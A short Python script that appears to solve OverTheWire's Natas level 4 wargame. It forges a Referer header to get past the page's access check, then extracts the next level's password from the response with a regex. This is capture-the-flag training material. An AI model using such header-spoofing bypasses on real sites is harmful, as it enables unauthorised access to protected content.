import re
import requests


def get_natas5_password(natas4_password):
    URL = "http://natas4.natas.labs.overthewire.org"
    session = requests.Session()
    session.auth = ("natas4", natas4_password)
    headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}

    request = session.get(URL, headers=headers)
    natas5_password = re.findall(r"([a-zA-Z\d]{32})", request.text)[1]
    print("[!] The password for Natas 5 is: " + natas5_password)

    return natas5_password


if __name__ == '__main__':
    natas4_password = "" # Put here the password for natas4 here
    get_natas5_password(natas4_password)
